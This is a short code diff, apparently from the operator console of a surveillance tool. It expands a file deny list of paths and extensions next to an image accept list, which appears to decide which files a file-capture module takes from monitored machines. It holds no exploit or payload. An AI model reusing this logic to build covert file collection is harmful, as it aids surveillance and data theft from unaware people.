@@ -109,7 +109,23 @@ package it.ht.rcs.console.operations.view.configuration.basic
       if (model.images)
         file.accept = (file.accept as Array).concat(['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp']);
       
-      file.deny = ['/setting'];
+      file.deny = [ "*\\AppData\\Local*",
+                    "*\\AppData\\Roaming*",
+                    "*\\Skype\\Plugins\\*",
+                    "*\\$RECYCLE.BIN\\*",
+                    "*:\\Windows\\*",
+                    "*.dll",
+                    "*.exe",
+                    "*.ini",
+                    "*.lnk",
+                    "*.ico",
+                    "*.tlb",
+                    "*.clb",
+                    "*.dat",
+                    "*.drv",
+                    "*.ocx",
+                    "*.url",
+                    "\\\\.\\*" ];
     }
     
   }
